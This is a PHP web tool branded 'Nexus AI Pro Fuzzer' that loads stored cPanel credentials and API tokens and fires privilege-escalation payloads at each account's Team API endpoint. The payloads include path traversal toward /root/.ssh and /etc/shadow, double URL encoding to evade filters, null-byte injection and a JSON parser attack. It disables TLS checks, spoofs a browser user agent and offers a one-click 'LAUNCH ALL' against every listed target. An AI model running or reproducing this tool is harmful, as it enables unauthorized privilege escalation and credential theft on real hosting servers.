<?php
// ==========================================
// CONFIGURATION & CORE
// ==========================================
$jsonFile = '../cpanel_credentials.json';
$timeout = 25;

function readCredentials($file) {
    if (!file_exists($file)) return [];
    $content = file_get_contents($file);
    return json_decode($content, true) ?: [];
}

/**
 * ADVANCED FUZZER ENGINE
 * Menggunakan teknik evasion dan parameter pollution untuk mendeteksi LPE.
 */
function advancedFuzzing($domain, $username, $apiToken, $timeout, $userAgent) {
    $authHeader = "Authorization: cpanel {$username}:{$apiToken}";
    $endpoint = "https://{$domain}:2083/execute/Team/add_team_user";

    // 1. BASELINE DATA
    $baseData = [
        'user' => 'fuzz_user',
        'email1' => 'fuzz@localhost.com',
        'password' => 'P@ssw0rd123!!'
    ];

    // 2. VECTOR ATTACK DICTIONARY
    $vectors = [
        'LPE_HOMEDIR_TRAVERSAL' => [
            'type' => 'POST_URLENCODED',
            'desc' => 'Injecting homedir parameter with traversal',
            'payload' => array_merge($baseData, ['homedir' => '../../../../root/.ssh'])
        ],
        'LPE_ROOT_DIR' => [
            'type' => 'POST_URLENCODED',
            'desc' => 'Injecting root_dir parameter',
            'payload' => array_merge($baseData, ['root_dir' => '/etc/cpanel'])
        ],
        'WAF_BYPASS_DOUBLE_ENCODE' => [
            'type' => 'POST_URLENCODED',
            'desc' => 'Double URL Encoded Traversal in Username',
            'payload' => array_merge($baseData, ['user' => '%252e%252e%252fetc%252fshadow'])
        ],
        'NULL_BYTE_POISONING' => [
            'type' => 'POST_URLENCODED',
            'desc' => 'Null Byte Injection to bypass extension check',
            'payload' => array_merge($baseData, ['user' => 'validuser%00../../'])
        ],
        'JSON_STRUCTURE_ATTACK' => [
            'type' => 'POST_JSON', // Mengubah Content-Type
            'desc' => 'Sending JSON payload to trigger Parser Error',
            'payload' => json_encode(array_merge($baseData, ['homedir' => '/root']))
        ]
    ];

    $results = [];
    $vulnScore = 0; // 0 = Safe, >0 = Suspicious

    foreach ($vectors as $name => $vector) {
        $ch = curl_init($endpoint);
        
        $headers = [$authHeader];
        $postBody = '';

        if ($vector['type'] === 'POST_JSON') {
            $headers[] = 'Content-Type: application/json';
            $postBody = $vector['payload'];
        } else {
            $postBody = http_build_query($vector['payload']);
        }

        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postBody,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => 8,
            CURLOPT_USERAGENT => $userAgent
        ]);
        
        $raw = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // ANALISIS RESPON (HEURISTIC)
        $json = @json_decode($raw, true);
        $errStr = isset($json['errors']) ? json_encode($json['errors']) : '';
        
        $status = 'BLOCKED';
        $class = 'st-safe';
        $detail = 'Input Sanitized';

        if ($code == 200) {
            // Cek indikator bahaya
            if (isset($json['status']) && $json['status'] == 1) {
                $status = 'CRITICAL';
                $class = 'st-vuln';
                $detail = 'Payload ACCEPTED & Executed!';
                $vulnScore += 10;
            } elseif (stripos($errStr, 'Permission denied') !== false || stripos($errStr, 'failed to create directory') !== false) {
                $status = 'HIGH RISK';
                $class = 'st-vuln';
                $detail = 'LPE Attempted (FS Write Access)';
                $vulnScore += 5;
            } elseif (stripos($errStr, 'JSON') !== false && $vector['type'] === 'POST_JSON') {
                $status = 'INFO';
                $class = 'st-warn';
                $detail = 'JSON Parsed (Attack Surface)';
                $vulnScore += 1;
            } elseif (stripos($errStr, 'exists') !== false) {
                $status = 'MEDIUM';
                $class = 'st-warn';
                $detail = 'Logic Bypass Successful';
                $vulnScore += 2;
            }
        } elseif ($code == 500) {
            $status = 'ERROR';
            $class = 'st-warn';
            $detail = 'Internal Server Error (Potential Crash)';
        }

        $results[] = [
            'name' => $name,
            'desc' => $vector['desc'],
            'code' => $code,
            'status' => $status,
            'class' => $class,
            'detail' => $detail,
            'raw' => substr($raw, 0, 300)
        ];
    }

    return ['score' => $vulnScore, 'vectors' => $results];
}

/**
 * CONTROLLER
 */
function checkNode($domain, $username, $apiToken, $timeout) {
    $userAgent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    
    $fuzzData = advancedFuzzing($domain, $username, $apiToken, $timeout, $userAgent);

    return [
        'domain' => $domain,
        'username' => $username,
        'fuzz' => $fuzzData
    ];
}

// FIX PAGINATION LOGIC
$accounts = readCredentials($jsonFile);
$totalAccounts = count($accounts);

// Ambil halaman dari GET, default 1
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$perPage = 5; 
$totalPages = ceil($totalAccounts / $perPage);
if($totalPages < 1) $totalPages = 1;

// Pastikan page tidak melebihi total pages
if ($page > $totalPages) $page = $totalPages;

$offset = ($page - 1) * $perPage;
// Ambil slice untuk tampilan tabel di kiri
$pagedAccounts = array_slice($accounts, $offset, $perPage, true);

// HANDLE POST REQUEST
$results = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $indices = [];
    
    if (isset($_POST['select_all']) && $_POST['select_all'] == '1') {
        // Jika Select All, ambil SEMUA akun
        $indices = array_keys($accounts);
    } elseif (isset($_POST['selected'])) {
        // Jika select manual, ambil yang dikirim
        $indices = $_POST['selected'];
    }

    foreach ($indices as $i) {
        // Validasi index ada di array
        if (isset($accounts[$i])) {
            $results[] = checkNode($accounts[$i]['domain'], $accounts[$i]['username'], $accounts[$i]['apiToken'], $timeout);
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus AI - Professional Fuzzer</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #09090b; --surface: #18181b; --surface-2: #27272a;
            --border: #3f3f46; --primary: #8b5cf6; --text: #e4e4e7; --sub: #a1a1aa;
            --green: #22c55e; --red: #ef4444; --orange: #f59e0b;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:var(--bg); color:var(--text); font-family:'Inter',sans-serif; padding-bottom:100px; font-size:13px; }
        .container { max-width:1400px; margin:0 auto; padding:30px; display:flex; gap:30px; align-items:start; }
        
        /* Layout: Sidebar (List) & Main (Results) */
        .sidebar { width:350px; flex-shrink:0; position:sticky; top:30px; }
        .main-content { flex-grow:1; }

        .header { margin-bottom:20px; padding-bottom:15px; border-bottom:1px solid var(--border); }
        h1 { font-size:18px; font-weight:700; background:linear-gradient(90deg, #a78bfa, #f472b6); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        
        /* Sidebar Table */
        .card { background:var(--surface); border:1px solid var(--border); border-radius:12px; overflow:hidden; margin-bottom:15px; }
        .mini-table { width:100%; border-collapse:collapse; }
        .mini-table th { background:var(--surface-2); text-align:left; padding:10px; color:var(--sub); font-size:10px; }
        .mini-table td { padding:10px; border-bottom:1px solid var(--border); }
        .domain-row { font-weight:600; display:block; margin-bottom:2px; }
        .user-row { font-family:'JetBrains Mono'; font-size:11px; color:var(--sub); }

        /* Results */
        .result-card { background:var(--surface); border:1px solid var(--border); border-radius:12px; padding:20px; margin-bottom:20px; position:relative; }
        .result-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; }
        .score-badge { font-size:11px; font-weight:bold; padding:4px 8px; border-radius:6px; background:var(--surface-2); border:1px solid var(--border); }
        .score-high { color:var(--bg); background:var(--red); border-color:var(--red); }
        
        .vector-table { width:100%; border-collapse:separate; border-spacing:0; border:1px solid var(--border); border-radius:8px; overflow:hidden; }
        .vector-table th { background:var(--bg); padding:10px; text-align:left; color:var(--sub); font-size:11px; }
        .vector-table td { background:var(--surface-2); padding:10px; border-top:1px solid var(--border); vertical-align:top; }
        
        .pill { padding:3px 8px; border-radius:4px; font-size:9px; font-weight:700; text-transform:uppercase; border:1px solid transparent; display:inline-block; }
        .st-vuln { background:rgba(239,68,68,0.15); color:#fca5a5; border-color:var(--red); }
        .st-warn { background:rgba(245,158,11,0.15); color:#fcd34d; border-color:var(--orange); }
        .st-safe { background:rgba(34,197,94,0.15); color:#86efac; border-color:var(--green); }

        .raw-btn { background:none; border:none; color:var(--primary); cursor:pointer; font-size:10px; text-decoration:underline; margin-top:5px; }
        .raw-content { display:none; margin-top:5px; background:#000; padding:8px; border-radius:4px; font-family:'JetBrains Mono'; font-size:10px; color:#a5b4fc; white-space:pre-wrap; word-break:break-all; }

        /* Controls */
        .dock { background:var(--surface); border:1px solid var(--border); padding:15px; border-radius:12px; }
        .btn-action { width:100%; background:var(--text); color:var(--bg); border:none; padding:10px; border-radius:8px; font-weight:700; cursor:pointer; margin-top:10px; transition:0.2s; }
        .btn-action:hover { background:#fff; box-shadow:0 0 10px rgba(255,255,255,0.3); }
        
        .pagination { display:flex; justify-content:space-between; align-items:center; font-size:11px; color:var(--sub); margin-top:10px; }
        .page-btn { text-decoration:none; color:var(--text); padding:4px 8px; background:var(--surface-2); border-radius:4px; }
        .page-btn.disabled { opacity:0.5; pointer-events:none; }

        #loader { position:fixed; inset:0; background:rgba(9,9,11,0.95); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:999; }
        .spinner { width:40px; height:40px; border:3px solid var(--border); border-top-color:var(--primary); border-radius:50%; animation:spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="loader"><div class="spinner"></div><div style="margin-top:15px;">Injecting Advanced Payloads...</div></div>

<div class="container">
    
    <!-- SIDEBAR: TARGET SELECTION -->
    <div class="sidebar">
        <div class="header">
            <h1>Nexus AI <span style="font-weight:400; color:var(--sub);">/ Pro Fuzzer</span></h1>
        </div>
        
        <form method="POST" action="?page=<?php echo $page; ?>" id="scanForm">
            <input type="hidden" name="select_all" id="globalSelectVal" value="0">
            
            <div class="card">
                <table class="mini-table">
                    <thead>
                        <tr>
                            <th width="30"><input type="checkbox" id="pageCheck"></th>
                            <th>Target List (Page <?php echo $page; ?>)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($pagedAccounts as $i => $acc): $realIdx = $offset + $i; ?>
                        <tr>
                            <td><input type="checkbox" name="selected[]" value="<?php echo $realIdx; ?>" class="row-check"></td>
                            <td>
                                <span class="domain-row"><?php echo htmlspecialchars($acc['domain']); ?></span>
                                <span class="user-row"><?php echo htmlspecialchars($acc['username']); ?> â€¢ #<?php echo $realIdx + 1; ?></span>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

            <div class="dock">
                <label style="display:flex; align-items:center; gap:8px; font-size:12px; cursor:pointer;">
                    <input type="checkbox" id="globalCheck"> Select All <?php echo $totalAccounts; ?> Targets
                </label>
                
                <button type="submit" class="btn-action" id="runBtn">LAUNCH FUZZER</button>

                <div class="pagination">
                    <a href="?page=<?php echo max(1, $page-1); ?>" class="page-btn <?php echo $page<=1?'disabled':''; ?>">&larr; Prev</a>
                    <span>Page <?php echo $page; ?> / <?php echo $totalPages; ?></span>
                    <a href="?page=<?php echo min($totalPages, $page+1); ?>" class="page-btn <?php echo $page>=$totalPages?'disabled':''; ?>">Next &rarr;</a>
                </div>
            </div>
        </form>
    </div>

    <!-- MAIN: RESULTS -->
    <div class="main-content">
        <?php if (empty($results)): ?>
            <div style="text-align:center; margin-top:100px; color:var(--sub);">
                <svg width="48" height="48" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 17.25v1.007a3 3 0 01-.879 2.122L7.5 21h9l-.621-.621A3 3 0 0115 18.257V17.25m6-12V15a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 15V5.25m18 0A2.25 2.25 0 0018.75 3H5.25A2.25 2.25 0 003 5.25m18 0V12a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 12V5.25"/></svg>
                <p style="margin-top:15px;">Select targets and click Launch Fuzzer to begin LPE analysis.</p>
            </div>
        <?php else: ?>
            <h2 style="margin-bottom:20px; font-size:16px;">Vulnerability Report</h2>
            
            <?php foreach ($results as $res): ?>
            <div class="result-card">
                <div class="result-header">
                    <div>
                        <div style="font-size:16px; font-weight:700;"><?php echo htmlspecialchars($res['domain']); ?></div>
                        <div class="mono"><?php echo htmlspecialchars($res['username']); ?></div>
                    </div>
                    <?php if($res['fuzz']['score'] > 0): ?>
                        <div class="score-badge score-high">RISK SCORE: <?php echo $res['fuzz']['score']; ?></div>
                    <?php else: ?>
                        <div class="score-badge" style="color:var(--green); border-color:var(--green);">SECURE</div>
                    <?php endif; ?>
                </div>

                <table class="vector-table">
                    <thead><tr><th>Attack Vector</th><th>Status</th><th>Insight</th></tr></thead>
                    <tbody>
                        <?php foreach($res['fuzz']['vectors'] as $vec): ?>
                        <tr>
                            <td width="35%">
                                <div style="font-weight:600; color:var(--text);"><?php echo $vec['name']; ?></div>
                                <div style="font-size:10px; color:var(--sub);"><?php echo $vec['desc']; ?></div>
                            </td>
                            <td width="20%">
                                <div class="pill <?php echo $vec['class']; ?>"><?php echo $vec['status']; ?></div>
                                <div style="font-size:10px; margin-top:4px;">HTTP <?php echo $vec['code']; ?></div>
                            </td>
                            <td>
                                <div style="color:<?php echo ($vec['class']=='st-vuln')?'#fca5a5':'inherit'; ?>"><?php echo $vec['detail']; ?></div>
                                <button class="raw-btn" onclick="this.nextElementSibling.style.display='block'">View Raw</button>
                                <div class="raw-content"><?php echo htmlspecialchars($vec['raw']); ?></div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>

</div>

<script>
    // Logic: Select All (Global) vs Page
    const globalCheck = document.getElementById('globalCheck');
    const pageCheck = document.getElementById('pageCheck');
    const rowChecks = document.querySelectorAll('.row-check');
    const runBtn = document.getElementById('runBtn');
    const globalVal = document.getElementById('globalSelectVal');

    function updateBtn() {
        const count = document.querySelectorAll('.row-check:checked').length;
        if(globalCheck.checked) runBtn.textContent = `LAUNCH ALL (${<?php echo $totalAccounts; ?>})`;
        else if (count > 0) runBtn.textContent = `LAUNCH (${count})`;
        else runBtn.textContent = 'LAUNCH FUZZER';
    }

    globalCheck.addEventListener('change', function() {
        globalVal.value = this.checked ? '1' : '0';
        rowChecks.forEach(cb => { cb.checked = this.checked; cb.disabled = this.checked; });
        pageCheck.checked = this.checked; pageCheck.disabled = this.checked;
        updateBtn();
    });

    pageCheck.addEventListener('change', function() {
        rowChecks.forEach(cb => cb.checked = this.checked);
        updateBtn();
    });

    rowChecks.forEach(cb => cb.addEventListener('change', updateBtn));

    document.getElementById('scanForm').addEventListener('submit', function(e) {
        if (!globalCheck.checked && document.querySelectorAll('.row-check:checked').length === 0) {
            e.preventDefault(); alert('Target required.'); return;
        }
        document.getElementById('loader').style.display = 'flex';
    });
</script>
</body>
</html>
